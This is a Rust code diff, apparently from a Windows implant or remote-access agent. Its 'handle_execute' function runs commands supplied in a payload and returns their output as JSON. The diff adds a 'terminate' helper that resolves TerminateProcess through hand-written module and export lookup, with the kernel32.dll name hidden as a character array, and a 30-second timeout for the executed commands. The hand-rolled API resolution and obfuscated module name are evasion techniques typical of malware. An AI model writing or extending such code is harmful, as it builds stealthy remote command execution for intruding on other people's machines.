@@ -862,6 +862,24 @@ unsafe fn find_export(module: usize, name: &[u8]) -> usize {
     0
 }
 
+unsafe fn terminate(handle: usize, code: u32) {
+    static CACHE: AtomicUsize = AtomicUsize::new(0);
+    let mut f = CACHE.load(Ordering::Relaxed);
+    if f == 0 {
+        let k32 = find_module_base(&[
+            b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
+            b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
+            b'l' as u16, b'l' as u16,
+        ]);
+        f = find_export(k32, b"TerminateProcess");
+        CACHE.store(f, Ordering::Relaxed);
+    }
+    if f != 0 {
+        let typed: unsafe extern "system" fn(usize, u32) -> i32 = core::mem::transmute(f);
+        typed(handle, code);
+    }
+}
+
 unsafe fn handle_execute(out: &mut Vec<u8>, payload: &[u8]) {
     if payload.is_empty() {
         out.extend_from_slice(b"{\"error\":\"empty command\"}");
@@ -979,7 +997,12 @@ unsafe fn handle_execute(out: &mut Vec<u8>, payload: &[u8]) {
     }
     close_handle(pipe_read);
 
-    wait_for(pi.h_process, INFINITE);
+    // bounded wait: 30 s, then terminate the child (no runaway processes)
+    let mut timed_out = false;
+    if wait_for(pi.h_process, 30_000) != WAIT_OBJECT_0 {
+        terminate(pi.h_process, 1);
+        timed_out = true;
+    }
     let mut exit_code: u32 = 0;
     get_exit(pi.h_process, &mut exit_code);
     close_handle(pi.h_process);
@@ -990,6 +1013,9 @@ unsafe fn handle_execute(out: &mut Vec<u8>, payload: &[u8]) {
     push_dec(out, pi.pid as u64);
     out.extend_from_slice(b",\"stdout\":\"");
     push_json_escaped(out, &output);
+    if timed_out {
+        out.extend_from_slice(b",\"timed_out\":true");
+    }
     out.extend_from_slice(b"\",\"exit_code\":");
     push_dec(out, exit_code as u64);
     out.extend_from_slice(b"}");
